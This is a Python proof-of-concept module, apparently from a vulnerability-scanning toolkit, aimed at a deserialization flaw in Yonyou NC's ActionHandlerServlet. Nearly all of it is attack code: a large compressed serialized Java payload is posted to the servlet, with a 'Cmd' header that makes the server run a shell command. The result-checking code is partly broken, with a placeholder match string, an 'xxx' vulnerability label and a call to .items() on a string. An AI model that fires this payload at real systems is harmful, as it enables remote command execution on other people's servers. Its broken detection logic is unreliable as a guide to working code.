'''
Function:
    用友NC actionhandlerservlet处存在反序列化漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet".format(scheme, netloc)
        data = '\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00\x95Y\x0b|\x14\xf5\x9d\xff\xfev7\x99\xc9f\xf2`!\x81\x05\x03\xe1!\xe6\xb9\x01\x8c)l\x10\x81\x00\x12M\x02\x12\x04B\xf01\xd9L\x92\x85\xcd\xce2;\x1b\x12\xb4\xa7\xad\xf4<\xab\xf5QQD=lmmz\xf5\xd1he\x89rP\xa8\xa7\xf6\xb4\xf5\xfa\xba\xd6k\xef\xd1\xbb^\xef\xbc\xbb\xd6\xda\xf3\x1e\xbd\xf6\n\xfd\xfdfw\x93MX\xb4\xdd\xe4\xf3\x7f\xfe\xde\xaf\xff\x7ff\x9e\xf99\xf2\xe2\x16f\xec\xd5\x87\xf4@\xc2\x0eG\x02\x9b\xf5\xf8@\xa7a\xbf\xbc\xe1\x13\x0f=<~\xa2\xd1\r\x0c\xc7\x0eh\x00\xe8\xaa\xb5\x90\x1f1|\xa3i\xf5\x07\xf4\x98\x1e\x1a0\x02!sp\xd0\x8c\xc6\xb9\x8fD\x8c\x90\x1d\x96\xf1>cdH\x8f$\x8c\xc0\xf6\xb0\xd1\xdb\xae\xc76Fmk\xe4\x93\xcf~\xe7\xb1Ug\x17\xfc\xc8\x05W\x1b\xdc\x0cb\xc3\xd7&\x8c\x1b"z\xb4\xbfaK\xcf^Fo\xe6\xadA=f\xa3$\xb5%250\x85\xe6a^s\xf7\x99&s\xaf\xf9\x10\xee\x8c\x1fh\xd3\x0f\x8e0Z\xf4\xa7\x87?~l\xa4\xf4\xb0\x1b\xd4\x06\xa5O\x0f\xd9\xa6\xc5|\xeb\xda\x98DC\x8aDC\x9aDC\x16\x89\x86\xed\x96\x1e\x8d\xf7\x99\xd6\xa0a1g\xe6\x19\xfc\x10\x9e}\x89\xa8\xd0\x8e\x07Z\x06\xf4p\xd4\xe8\xcd"\xb0\xec\xf5#?\xab:x\xc4\xe3\x02u\xa3(\x9c\xb5\x13\xb7Q\xdf\xfd\x87\x89\x92\xb0\xd2(\x1f$L6\xca\xa9\x1d5\xbf|\xbbq\xceQ\x978\x92\xdd\xa7\xb02\xcd\xbf\xb72<\xb3\xf5\xa8\x9dEp\xd7\xd0\xfd3\xd6\xb9\x9e?\xec\x12\x8b\x16\x843\x10\xfb\xf1Gp\x0f\xc7\x86\xd2\xde\x194\x0f\x86#\x11= >\x8c\x87\xacp\xcc\x0el0\xfa\xc2\xd1p\xb4\xbf%\xa2\xc7\xe3m\xa6\xdekX\x98\xfc\xfdaFn\x8d\x0e\x99\xfb\x0c+K\xac;\xdf9\xbf\xef\x96[\xdfZ\xe9\x82\xbb\x1by\xe1uV?\x1bwfw\xae\xf8*\x0c\xb7\x1b\xf6\x80\xd9\xdb\xa1\x0f\x1aSC\xb0\xd3\xb6X\xc0\xe6n\x06\xd9\xaa[\xfa\xe0\xf6\x91\x98\xc1d|\xd9d\x1c\xf1S\x8eH\x93\x0f\xc8z M\xfe\xfe\xb7v=Q\x1a\xaf\x8ed\xccM\x0c\xe7\xcb\x86K\xe1?]\xfe\x83\xe7\xde\xfc\xe6\xee\t\xaf\xc0Fy\xbfao0B\x11\xdd2z\x1d\xabZ\tQ6!\x96\x9d+\x94\x86\x9cQ\\\xda\x99\xce\xea\x1c\x87~f\xc4$\n\xa3\xc6\x81V\xc7\x1f!c\x1a\xde\x9cix.\x1b\xaeu\x8d,\x9c\xab{\xfd3\xef\xcf\xfeU\xbe\xba\xfd\xc7iaf_\xf7\xc6\xb9\x97O3\xccr\xda\xe7E\x05>\xed\xc5\x06<(\xcda\x99>\xa4\xe2a/\xe6\xe1\x88\x17\x8f\xe0\xa84\x8f*xL\xb6\x1fWq\x8f\x17\x95\xf8S\x15\xc7T<\xa1\xe03*>\xab\xe2I\x05\x9f\x13\x84\xcf\xabxJ\xc5\x17\x14\x8c\x16\xa2\x1c_\x94\xe6\xcfT|I\xc5\xd3\n\x9e\x11\x80g\x15<\xe7\xc5\x971\xa6\xe2y\x05/\xa8\xf8\x8a\x97\xa5}QH\x1eW\x91,\xc0R\x9cP0\xee\xe5\xfe%\x15/\xcb\xe6I\xc1\xfbs\x15\xa7\x14\x9c\x96\xe1WU\x9cQpV\xc5\xd7T\xbc"\x0b\x7f\xa1\xe0U\x91\xed5/^\xc7I\x15_\x17j\x7f\xa9\xe2\r\xe9\xdfT\xf1\r\xe9\xbf)\xcd[*\xfeJ\xfao\xa9\xf8v\x01\x93\xfe\x8e\xf0\xf9\xae4\xdf\x93\xe9_+\xf8\xbe\x10\xfa\x814o\xab\xf8\x94\x8a\xbf\x11\t~\xa8\xe2G^\xfc-\xfeNp\xff^\xc5?\xa8\xf8\xb1\x8a\x7fT\xf0O^l\x15\xdbm\xc5OT\xfc\xb3\xf4?U\xf1/*\xfeU\xc5;*\xfe\xcd\x8b\x7f\xc7\x7fH\xf33\x05?\xf7\xe2]\xfc\xc2\x8bn\xbc\xa7\xe2\x97\xd2\xff\xa74\xefK\xf3_\xb2\xf7\xdf\xd2\xfc\x8f\x17\rB\xe3\x7f\x85\xd3\xafT\xfc\x9f`\xffZ\xc1oD\xc6\xff\xf7"\x8c\xdfJ\xf3\x0b\x81=\'#\xa79\xef%\x10I\xe3\xf2\x92\x9b<\xd2\xe4\xe5\xa5\xb3n\x05+C\xf9\x8c@\n\xc3\x92\xaaR\x013!\xafJ\x85*i\xac\x1e\x15)TLp\x85c\x94+S\x08\x9e\x98i\xd9\x84\x99Y{\xadQ\xdb\xe8\xe7\xcaC\xc8_\xcd\x19o\xaf!\xb8\xab\xaaw0l\x8b\xd9k\x10Wv.\x90\x1d\x89\xc1\x1eN`\xbd\'\xc2+\xde\x8d\xc3!#\xe6\xe48\xa1 \xc2\xb5\xc1\xc9\x12\xc2\xa5U\x17\xf2\xac\xbe \x19\t\x8a1l\x84\x126\x93Z\xfa!\x18\x93\x82\x0b\ncZ\xc6\x10\x17b\xc6\\\x95\x033\x87V9\x89\xb9\xadD\x94\xd5\xe84\x13V\xc8\xd8\x14\x16\x9d\x94u\x8dN\xf5\xd3p\x07\x0eiTB\xa5\x1a\xcd \x9fF3i\x16\xef\xda\x03\x96\xa1\xf7\xc65*\xa3r\x85fk4\x87\xfc\x1a\xcd\xa5y4\xb5jmw\xe0\x9a5\xba\x84*4\x9aO\x0bX\xf2\x01\xdbfw\xe4\xdb\xba\xc5%\x83\xfd2\t\xbd-\x11\x8d\xa6L\x9ao\x0f\x84\xe3K\x961\xa7\x01=\xda\x1b1,\xc2\xfcI\xb8\x0e\xb33\x11\x1a\xd8\x146"\xbd\x13\xa6\xd7\xa8R$\xcb\xef\x8f\x98=z\x84\xb5\x89Yf\xc8\x88\xc7\xb9\xde\x12\x8a\'\x0f\xe3\xb6p\xdc\xd6h!-\x12q\x17\x8b\xee\xc6~B!\x8b\xb2\xcd\x88\xc7\xd8\x85\xe2\xe2i.\xd2h\t]J(\x9d^\x8d\x15Z\xaa\xd1eT\xc5^g\xfc\xcd\x86\x1c\nS\xc0R\x16f&\xa1\xc1^\r\x9f\xc4\xdd\x1aUS\r\x83\xc7\r\xbb\xd3\xd6\xed\x04\x93\xae\xa5:J\xdd`\xa6x\x8a\rO\xf5\x84%Yg\x8am\x0e\x86t;u\xcf\xe9I\xf4\x05\xd6\x8f\xd8F\xcb@"\xbaO\xc3\x9f\xe0.\x8d\x02\xd4@P\x99\xb4l\xb0\xd6\\\x1b5Z&\x92+\xbd\xe6N+,\x016s\x92\xd1\x84\xe9\xd2\xab\x81h\xd8th\xaeO\xf4\xf5\x89"\x9e\x03\x96\x1e\xd3h9\xee"TN3I\x87io2\x13\xd1l\xfb\xaf\xa0\xcb\x15j$@\xa3+\xa8\x89\xed g {\xaf2j\xda\x95\xd1D$\xa2\xd1G\xa8\x82\x90\xb7X~\x1a\xad\xa4U\x1a\x05\x89\xe3\x8f\x82\x1a\xad\xa6+\t\x8b2(\xe9\xb0\xae\x1c0\xe3v\xa5\x1c\x91\xba]iX\x96i-\xd4p\x1bn\xd7h\r]\xa5\xd1ZZ\xa7\xe1c\xf8\xf8\x14\x9b\xa7BN\xcc\xc7\xda\xb7\xe0\x103\\+?\r\xf7\xe0n6\x85\x19\x0fD\xf9\xe8Th\x83F\x1b\xc5#\x9bD(\xf7\x81pT\xca\x81\xe3.W=\x8fgOw\xe3\xfaD8\xc2\x0e\xd6\xe8j\xda\xccD+\xeb\xa3\x95\x8d\x1a\xb5\n\xb6\xab!\xe4\xac\xd8\x95\xac\xbf+> $B\n]\xa3\xd1\xb5\xd4\xc6\x8c\xa9=\xe3b\'\x06;Cz4jX\nuh\xb4\x85\xb6\x8a\xac\xd71\xca\x1e]\xa3m\xd4\xa9\xd1v\xba^\xa3\x1d\x921;y\x97v\x89\x12JCO8\xda\x10\x1f\x10\xe0.\x9erD\x05\xb8\x06\x08\xf1\xdd\x99\x88\x8d\x1avC\xa7\x19\xdagp\x84ws\x843\xe8\x1e\x8dn\xa0\x1b5\xba\x89\xaeW\xe8f\x8dt\t\xfc\x1eZ\xa4PH\xa3^\xaa\xd7\xc8\x90\xfc\xee\xa3~\x8d\x06d/,\xcc*2\xf6O\x17\xa6\x94\xed\xeb*\x07\xe3\xfd\x95\xf5k4\xda+Js\x12a\xe6t@s\x1f{\xe8S\xb8\x97\xe4|&\x14\x85\x12\x96e\xf0\r\xccq\naVU\xf5\x85\xd5\x81\xf3\x93\xd3\'5\xb9\xda2\x13\\\x1d\xfc9\xe0\x9c-\x06V\x198]`gV\xe5*\xa7\xa5YW\x11\xa7H\x10\xea?\xa4\xaeZF\x9f\\\xd3\x1a\x1c\xf0\xe6)\xce\x9f\xb2\xc5\x1aq~\xad\x0bIe\t;\x95\xcaS\xb5[\x0e\x07\xb7S\xcb\xa6\x94\xef\xf4\x95\xaa\xfa\xc2%v\x1f\x83\xcb\x05n\xbaE&J\xb2\x1a2\xa36_\xc5Y\xc9y\xd9D\xf9~nu\x1a\xfb\x13\x06\xdf\x91\x9a\xab\xd9\xf3EL\xa93\x113\xacP\xca$\x9ex\xf8\xa0\xe1\x1cY\xad\x84\xb2\xaa\xd6\x9c\xec\xa5\\\xa5n\x91\x84\xb59Ls\xe1\x8d1\x97\xb1R\x14\x98\xdc\x9c\x8b\xedq=\x0e;w\xddi\xe7SZ\x90\x1c\xf7\xdb\x9c\xe2\x8a\xc7\xd35\xcdSU\xdd\xbd\x9e\xbb\xed][7rN\xe5\xf0\xbe\x87uf\x87d_&\xa7[y\x82\xf0\x8c\xacH\xc9H\xacp\xb9I\xb9\xa6L\x02\x8d\xdd`\x0c\xdbY\xb7\xfe\xe9\xc1\x99\xb5\xc5\x14\xcbrn\xb0\x1d\xd8gz$..\xc9\xa14\xfb\xd1\xc3\x96\x1f\xe4c\x8b%\xb6\xec\xf8\xce\xb0=0\r6\x13\xb5\xbb\x9dS?\x16\xd1E\xaf\r\x17\x8d\x8d\x8b\xc6L\xaeh\xcb\x8b\xc7"a\x8e\xdf\xcbr1\xec\xce\x19\x9f1\x9d\xd3\x9e\xcf\xaa\x8bH\xc9\xc1\xa78\xcf\xd0[\xfa\x08\xe5S\xc3p\xf2\x865;\x1b5s\xfa7\x8b\xfb\xf2\x1c;L=LG\xe2\xb61\x98:\xab\xb7Z&\x87\xbc=\xc23\xdbl3\x0f\x18V\x8b.\'w\xbe\x1e\x8b\x19\xd1\xdf#\xe1\xa7\x94t\xd1\xc763\x87\xf5\x8c)"\xd9a\t\x05\xaf\xdc\x0f2\x93\xb2)\xfeO/3\x8d\xaa\xaa\x1c\xa6\xca\x06\xdd\x9a\xba\x924O\xe1\x91^L\x15\xc1\xd6h,\xc17\x03.w\x83b\x9d4r\xd8l\xc8\xda\x90\x84\xab\xca\xb9!\x86\xd3\x12qc\x83\x11\t\x0f\xf2qo]\xc4\xa3Y\xef&\xd2GQ\xb3s\xd3\x8awp\xa8;\xb5C\x022\xeaLD\xaa\x8dR\xfd3R)\xbd\xfcPi\x99#\x17q\xfc\x8e\x0f\xe49\xcd\x0cj8j\xef\x90(\x91\x18\xb9\x10\xc9I\xe4\x12\x16`K\xc2\xce\xb2\xcb\x9c,\xbbd\xef8\x04\xe3-\x113n\xf4fn:S-\xc4\x95\x8f\x17\xc3\x91\xd4%\xd3\x93>\x93r\xd1\xe2\x08<\x90\xba1\xe5\xf5E\x12r\xa2\xe7\xc5#\x86\x11\x93\xfar\x8d\x88U`\x0c\x873\xb2\xe7\x85\x84g*J\xdaY3\xbd\xdf\xc0B~\xb8\xaa\x00\x8b\x0f\x17\xff\xf1\x9dE\x9eZ\xe5\xb2\xc2}>\xaf\xf3\xb5\x9a\xe7\x9f\x00\xdcoC\xc5\x0c\xde|\xa4\xe6\x04h\x1c\xae$\xdcm\xb5Ix|yI\xe4\xb7\xd7y\x92P\xeax\xae\x9eA\x01\xffw\xb8\x9b<e\x9e\xfa\xd3O\xba\xf6\xd6\x97yV\x04\xf3\xfcy\xaf#\x7f\xd4\xb5\xc3\xcf\xe0\xde`\xbe?\xdfW\x98\x84\xf6(\x8axT\xe4\x8cxw\xa5\xecz|\xc5\x93\x14eA\r*~\xe5,J\x1c\x902\xbf" \xa5Y J\x1aD\xd6g\xc8\xfa(\xca\x83\xaa3Ob&\xff\xa7V/\x84\x96\xadY)\x84\xd24Bj\x9e\x83p\xd9\xb4\xf53(?#l\xdcM\x05e\x05~\xf5%\xcc&<I\xa6_-+x\ts\\\x08z\xfd^\xc1\xf3g\xe1y\x85^\xa1\xbfP\xd6\xe7\xbaOa^\x12\x97\xf8\x0byP\x91\xc4\xfc\xa0\x96\xdaX\xe0\xe1\x8d.\xb7\xaf\xb2\xd3\xd9\xe5Y\x05\xcf\x16\xf2l\xfe\x19T\x06\x8b\xfcEbH\x9c\xaf\xf1\xb3\xd9\x16%\xb18X\xec\xd7\x04qI\n\xf1\x05\\\xea`j)\xcc\x93X\xda5\x03_?\x81\xcb\x84\xc2\xce\x1a_U\x12\xd5\xc1\x12\x7fI\x125\xac[\x89\xaf6?\xc5\xaf\xae\xb3\xcb#\xb8]y)\n\xf5~%\xdf\xa1\xe0/\xe6\x1d!\xe3\x16"]y2\xf4\x17\x9f\xcePL1\x0f\xa4\x98\xfbK\xb2y\xfb\x15\x07b\x14[\x82%5\xbee\xc2\xb8\xd4_\xea[\xee\xc9p\x14.\xa5\x9e\x0c\x171\x822\x95\\iNr\xb3\x0f\x15\xd0\xe8\xb9\xbbG\xd9\x9al\t\xf7!\x0f\x8d\xfe\xf6\xa1\xe79>\x8f\xe0I<\x05\x1f^\xc5w\xf1}\xf8\xe8\x94k\xb9\xab\x91\x9f\xe7\x9b\xd0\xec\xba\x87\xfb5\xe8r\xfa=\xb8\xd5\xe9os\xdd.\xbd\xeb\x0e\xd7]\xce\x9c\xf0\xc7\x1c\xf7\xef\xa2\x99[/<(\xe4?\re(\xc2\\\x14\xf3\xf3\x7f)\x96q\x0e4a&S\x9a\x85\x8d\xbc\xb3\x07\xe5\xe8\xc7lD0\x076\xfc\x9cAs\xf9\x01j\x1e\xee\xc3%,\xcd|\x96g!K\xb4\x00\xa3\xa8\xc48\x16\xe1\x14\x16\xb3t\x97\xb2|U,\xe1R\xbc\x8d\xcb\xf0\x13T\xe3\x1d\xd4\xe0=\xd4\xe27\xe0\xc7,\xd4S1\x02T\x81\x06\xaa\xc22\xba\x1c\xcbi%V\xd0Z\\N]h\xa4\xdbp\x05\x1dB\x13\xdd\x89\x95\xf4i\xac\xa2Sh\xa6W\xb1\x9a\xbe\x81+]%X\xe3Z\x8e\x16\xd6\xfa*W\x13\xd6\xba\xd6`\x9d\xebF\xacw\xdd\x8e\r\xae;\x10p\xdd\x85V\xd6t\x93\xeb^lv=\x80R\xd7\x11\\\x8b;Y[\x0f\xeb.\xfa\xf3\x13Z*\xdf\xb1\x8a{7\xf73j\xc7\xb1b\xac\xdd\xc9\xf8FN\xf0+\xc6\x18L\x10\xf2py\xda`\xc5\x0e\xe0V^\xb9\x8e\x8b\xc6\xb6\t\x82\xb2\xcfO\x93\xdc\n\xc1\xe3\xbc\xe6\xe1~\xb0\xf65h\xbe&&\xf5\x91\xa3\xc8\xf7\xad\x1c\xe3\xd1\xaa\xb6Z_0\x89\xe6\xa3X\xc3\x03_S\x12\xab}W&\xb1\xa6\xbd\xeet\xde\x13\x0ct\xd5XM\x9d{\xc5q\xac\xad\xa9\xf3\xac\x18\xc7\xbaq\xac?\x8e\x96\x93\xd8\xd0\xc5\xd5hcG}\x12\x9b|W\x8f\xd5L\xe0nv\xba$Z\xc7\xe4\xdd\x9c#d\x13{\x11\xd8\xc5m\x17\xfb\xb1\xdb\xf1\xdd|\xdc\x80:\xdc\x88\x15\xb8\tW@\xc7j\xf4\xa0\x15!V\xa1\x17;`0d?c\xdf\x93Q\x81\xde`\x05\n\xb8\xaf\xf1]3\x8ek\x93hkwd\xa7\x0e\nz\xea|\xed\\\xc6\x8ebm\xad\xaf\xc3\x19T\xd6\xfa\xb68\x85m\xf6Il\xed:\x81\xeb\x18v\x9b\x8fCx[\x12\xdb\xdb8\xb7*\x9d\xbc\xee\xf2\xf8\xae\xe7\xac\xaa\xed\x0czFq\xe5\x07#\xef\x98\x8a\xbcS\x90w\xa5\x91\xc7\xd1\xe5\xe72\xb3\xbb\xe3$\xba\xbb\xd8 {N\xe0\x06\xdf\x8dI\xdc$\xb57\x89\x9b\x8f\xa2Pz}\x14y\xbe\xa6`~\x1a\xaag\x12*\xcd\xc8\x9f\xcfL.\xc4Hq\x96\xc2\x1dT\xea_\x83\xc2\xb8!\xbf2\x96"\xde\x1b\xcc\x9fX\xcb\x1f\x0b\xaa\x13\x13\xf5\xabl\xb1\x07q\x8e\n8\xba\xa4\xaf`\xeb\x15\x90\xcf\xe9+h\x81\xf4i\xffD9k\x80}l\xdf\x08\x07\xd4 \xfb(\xcayfr\x1e\xc5\x10\xc0~\xacG\x9c\xfd\x91`\x88!\xce\xb2a\xa6v\x0b\x1e\xc7\xadx\x0e\x1f\xc5\xd7\xf8\x14\xfb\x1e\xaf\xfe\x9a\xcf\xafs\xfcd\xc8\x11L\xf9\xb8\x9d\xb9~\x8c\n\xf9\xc1\xdb\xc7k\xe5\xbc6\x97\xc7\x15<^\xcc\xde$y\xfeK\xfb\xf5\x0e\x96R\xbe\xbe\xbc\x9f\xf1\xab\xe3\xcbGQz\x92\xed\xec3N\xa0\xafc\x14E\xce\xa4_&lkVo \xc8e1\xdcU[\x97\xc4\xde\x13\xd8\xc7\xa6`\xfb\xefa\x13q\xd7\xc3\x95\x8c\r\x13\xe1c\x85g\x83\xc1\x02\x99E\xf9P\xe0\xce|\x147\x8b\x95c\xc7P\xea\xf7\xcah\x7f\x12\xd6\xe8\xf9w\xe5`I/*\x93\x8bjz\xb1@F\x99E>J\xe2\xfe\x02nf\xc1\x1e\xc7\x9009\xb0S\nb\xe1\xe8\xf9c2\x0b\t\xa7a.;\x1di\xbf\xfaF\xd8\x85,\xf5A\t\xa4[R\xee\x1c\xf3\xdd:\xc6i>\x8e\xd38\xcb\x0e\x02\xbe\xc5\x85\xa9a\x8aC\xeeeG\xdc\xc7W\x84\x07\xb8P=\xc8\xe5\xef0\x97\xbe\x87\xd0\x89\x879]\x8e \x8cG\xd85G\xd9\xfc\x8f1\xce\xe3\x0cq\x8cGO\xe0\x8b\xf8,\x9e\xe5\xe2\xf7\x02>\xc7\xd4\x9fb\xfa_`\x0e\xa3x\x85w^\xc3\x97\xf0&\x9ef^\xcf1\xb7g\xd8q\xcfr\xe9\xfb2s\xbd\x8f/\x1b\xa9ZQ\xc3\x15E\xaaLqM\xcd\x8b\x9c\xf4/\xa2%\x89\x8f\xee|~"X\xbc,5\xf0"\'\xf3q^\xb9\xdf\xb9\xb4<`\xa3\xb0W>\x7f\x18\xce#\xcd\xc4\xaby\xd7\x90\x95\xba\x9f\xa7>\r\xa4.m\x9fy\xef\xf3+\x0f6\x7fe\xbd\xf36\xdeyw_\x95\xf3\x9d\xbf\x10\x80\x0c.\x99|\xd5/\x83\xf9\x17\xffB \x83ES\xa1\x978\xd0%N\x0b\xe7;\x1f\xd2\xdf\xf90|\xe1\x87\xc1v=\x96\xa7\xfc\xf0\xec+\xe57\x7f\xdb\r\xd7&x\xe5]\xed&\xe7\xabZ+\n\xe4\x9df|\xc0\x8c\xf4\x0e\xc7\xd24J\x0f\xa8\xd2:\xd4\x86\x87\x7f\x07V\x94\xbf\x11m\x1c\x00\x00'
        self.headers["Cmd"] = "echo c4ca4238a0b923820dcc509a6f75849b"
        try:
            result = requests.post(url=url, data=data, headers=self.headers, proxies=self.proxies, verify=False, timeout=3)
            # print(result.text)
            if "页面存在相关内容" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在xxx漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                for param, value in data.items():
                    values = param + "=" + value
                    self.value_list.append(values)
                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False

